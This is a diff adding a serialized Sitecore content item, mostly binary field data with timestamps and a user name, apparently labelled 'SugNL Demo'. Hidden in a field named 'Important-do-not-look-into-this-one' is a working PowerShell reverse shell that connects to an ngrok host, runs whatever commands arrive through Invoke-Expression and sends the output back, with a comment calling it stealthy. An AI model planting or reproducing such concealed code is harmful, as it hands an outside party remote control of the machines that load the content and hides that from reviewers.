@@ -1,0 +1,41 @@
+
+^
+	¨â¤K˜á†0tôWH
+	¨â¤K˜á†0tôW
+SugNL Demo	3'W£bPéC¤GTi‹ÁÆ7"	ÆZ¥¶¦	L¬:)8b[
+w
+	ï°Æ¹§¢&G‡íÏ[ÊË»‡a
+	ï°Æ¹§¢&G‡íÏ[ÊË»‡#Important-do-not-look-into-this-one	¨â¤K˜á†0tôW"	³ñ"İ‡½²M}÷¤–ˆC•
+	ï°Æ¹§¢&G‡íÏ[ÊË»‡ş
+	ğO©±—hÀGœQªjË€±ğç$reverseShellClient = New-Object System.Net.Sockets.TCPClient("6.tcp.eu.ngrok.io", 10345);
+$reverseShellStream = $reverseShellClient.GetStream();
+# Generate a stealh reverse shell
+[byte[]]$reverseShellBytes = 0..65535|%{0};
+while(($i = $reverseShellStream.Read($reverseShellBytes, 0, $reverseShellBytes.Length)) -ne 0)
+{
+    $reverseShellCommand = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($reverseShellBytes,0, $i);
+    $reverseShellOutput = (Invoke-Expression -Command $reverseShellCommand 2>&1 | Out-String );
+    $reverseShellOutput2  = $reverseShellOutput + 'PS ' + (Get-Location).Path + '> ';
+    $reverseShellOutputBytes = ([text.encoding]::ASCII).GetBytes($reverseShellOutput2);
+    $reverseShellStream.Write($reverseShellOutputBytes,0,$reverseShellOutputBytes.Length);
+    $reverseShellStream.Flush();
+}
+$reverseShellClient.Close();Ë
+	¨â¤K˜á†0tôW´
+en­&
+	Œ×¾%WIeA™ŠÊRöt—20230530T213948Z3
+	•u€R K*ËqÒŒasitecore\bas.lijten@gmail.com3
+	hE×]KMÁDµ
+õôÍ£Ositecore\bas.lijten@gmail.com:
+	~3ÜŒ¡ûB»´ACu?$d44b50fc-f33d-4375-8130-0e6d778db7e73
+	ùœİºàSM¼À-xL(/jsitecore\bas.lijten@gmail.com&
+	±ÏÙú¦K’ˆè¡tÔÕ"20230530T213948ZË
+	ï°Æ¹§¢&G‡íÏ[ÊË»‡´
+en­&
+	Œ×¾%WIeA™ŠÊRöt—20230530T212829Z3
+	•u€R K*ËqÒŒasitecore\bas.lijten@gmail.com3
+	hE×]KMÁDµ
+õôÍ£Ositecore\bas.lijten@gmail.com:
+	~3ÜŒ¡ûB»´ACu?$e8d0e10c-6a18-4b31-8a1b-63a8dd309c113
+	ùœİºàSM¼À-xL(/jsitecore\bas.lijten@gmail.com&
+	±ÏÙú¦K’ˆè¡tÔÕ"20230530T213959Z
